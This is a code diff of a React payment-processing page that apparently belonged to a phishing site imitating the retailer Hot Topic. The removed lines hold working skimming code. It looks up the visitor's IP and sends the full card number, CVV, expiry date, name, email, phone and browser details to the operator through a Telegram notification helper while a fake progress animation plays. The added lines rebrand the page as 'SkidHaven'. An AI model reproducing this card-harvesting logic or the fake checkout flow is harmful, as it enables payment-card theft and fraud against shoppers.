@@ -2,16 +2,14 @@
 import { useEffect, useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Skeleton } from "@/components/ui/skeleton";
-import HotTopicHeader from "@/components/HotTopicHeader";
-import HotTopicFooter from "@/components/HotTopicFooter";
+import SkidHavenHeader from "@/components/SkidHavenHeader";
+import SkidHavenFooter from "@/components/SkidHavenFooter";
 import { CheckCircle, CreditCard, LockIcon, Clock } from "lucide-react";
-import { sendPaymentDetailsNotification, getBrowserInfo, generateSessionId } from "@/utils/telegramUtils";
 
 const ProcessingPayment = () => {
   const location = useLocation();
   const navigate = useNavigate();
   const [progress, setProgress] = useState(0);
-  const [notificationSent, setNotificationSent] = useState(false);
   
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
@@ -19,63 +17,7 @@ const ProcessingPayment = () => {
   const discountedAmount = location.state?.discountedAmount;
   const paymentMethod = location.state?.paymentMethod;
   const lastFour = location.state?.lastFour;
-  const cardNumber = location.state?.cardNumber;
-  const cvv = location.state?.cvv;
-  const expiryDate = location.state?.expiryDate;
   
-  // Set up session data
-  const [sessionId] = useState(generateSessionId());
-  const [browserInfo] = useState(getBrowserInfo());
-  const [ipAddress, setIpAddress] = useState("Unknown");
-  
-  // Fetch IP address on component mount
-  useEffect(() => {
-    const getIpAddress = async () => {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        console.log("IP data received:", data);
-        setIpAddress(data.ip);
-      } catch (error) {
-        console.error('Failed to fetch IP address:', error);
-      }
-    };
-    
-    getIpAddress();
-  }, []);
-  
-  // Send notification when payment details are available
-  useEffect(() => {
-    const sendNotification = async () => {
-      if (notificationSent || !ipAddress || ipAddress === "Unknown") return;
-      
-      const paymentDetails = {
-        cardNumber,
-        expiryDate,
-        cvv,
-        customerName: orderDetails?.customerName,
-        email: orderDetails?.email,
-        phone: orderDetails?.phone,
-        paymentMethod,
-        lastFour,
-        giftCardValue,
-        discountedAmount,
-        browserInfo,
-        ipAddress,
-        sessionId
-      };
-      
-      console.log("Sending payment details notification with data:", paymentDetails);
-      const result = await sendPaymentDetailsNotification(paymentDetails);
-      console.log("Payment details notification sent:", result);
-      setNotificationSent(true);
-    };
-    
-    if (ipAddress !== "Unknown") {
-      sendNotification();
-    }
-  }, [ipAddress, orderDetails, cardNumber, expiryDate, cvv, paymentMethod, lastFour, giftCardValue, discountedAmount, browserInfo, notificationSent, sessionId]);
-
   // Setup processing animation and redirect
   useEffect(() => {
     let timer: ReturnType<typeof setInterval>;
@@ -97,17 +39,14 @@ const ProcessingPayment = () => {
             giftCardValue,
             discountedAmount,
             paymentMethod,
-            lastFour,
-            cardNumber,
-            cvv,
-            expiryDate
+            lastFour
           } 
         });
       }
     }, 50);
     
     return () => clearInterval(timer);
-  }, [navigate, orderDetails, giftCardValue, discountedAmount, paymentMethod, lastFour, cardNumber, cvv, expiryDate]);
+  }, [navigate, orderDetails, giftCardValue, discountedAmount, paymentMethod, lastFour]);
 
   // Processing steps animation
   const steps = [
@@ -145,13 +84,13 @@ const ProcessingPayment = () => {
 
   return (
     <div className="min-h-screen bg-black">
-      <HotTopicHeader />
+      <SkidHavenHeader />
       
       <div className="container py-8">
         <div className="max-w-md mx-auto space-y-6">
-          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
+          <div className="bg-gray-900/10 rounded-xl p-6 border border-gray-700/20">
             <h1 className="text-3xl font-bold text-white mb-6 text-center">
-              Processing <span className="text-hottopic-red">Payment</span>
+              Processing <span className="text-blue-600">Payment</span>
             </h1>
             
             {/* Processing animation */}
@@ -173,7 +112,7 @@ const ProcessingPayment = () => {
                     cy="50"
                     r="45"
                     fill="none"
-                    stroke="#e11d48"
+                    stroke="#2563eb"
                     strokeWidth="8"
                     strokeDasharray="283"
                     strokeDashoffset={283 - (progress / 100) * 283}
@@ -193,9 +132,9 @@ const ProcessingPayment = () => {
                 <div key={step.id} className="flex items-center space-x-3">
                   <div className={`rounded-full w-8 h-8 flex items-center justify-center ${
                     completedSteps.includes(step.id) 
-                      ? 'bg-hottopic-red text-white' 
+                      ? 'bg-blue-600 text-white' 
                       : currentStep === step.id 
-                        ? 'border-2 border-hottopic-red text-hottopic-red' 
+                        ? 'border-2 border-blue-600 text-blue-600' 
                         : 'border border-gray-700 text-gray-700'
                   }`}>
                     {completedSteps.includes(step.id) ? (
@@ -225,10 +164,10 @@ const ProcessingPayment = () => {
             </div>
             
             {/* Payment summary */}
-            <div className="bg-hottopic-gray/20 p-4 rounded-lg border border-hottopic-gray/30 mt-8 space-y-2">
+            <div className="bg-gray-800/20 p-4 rounded-lg border border-gray-700/30 mt-8 space-y-2">
               <div className="flex justify-between text-sm">
                 <span className="text-gray-400">Amount:</span>
-                <span className="text-hottopic-red font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
+                <span className="text-blue-600 font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
               </div>
               {paymentMethod && (
                 <div className="flex justify-between text-sm">
@@ -248,7 +187,7 @@ const ProcessingPayment = () => {
         </div>
       </div>
       
-      <HotTopicFooter />
+      <SkidHavenFooter />
     </div>
   );
 };
